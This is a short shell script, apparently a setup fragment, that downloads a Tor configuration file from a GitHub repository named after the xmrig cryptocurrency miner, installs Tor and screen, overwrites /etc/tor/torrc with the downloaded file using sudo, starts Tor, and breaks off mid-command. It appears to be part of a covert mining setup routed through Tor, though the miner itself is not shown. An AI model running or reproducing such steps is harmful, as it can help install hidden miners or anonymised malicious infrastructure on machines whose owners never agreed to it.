wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/torrc

gpg --keyserver keys.gnupg.net --recv A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89
gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | sudo -E apt-key add -
sudo apt update
sudo apt install -y tor
sudo apt install -y deb.torproject.org-keyring
sudo apt install -y screen

sudo rm /etc/tor/torrc
sudo cp torrc /etc/tor/torrc


sudo /etc/init.d/tor start
bash -c 'echo "
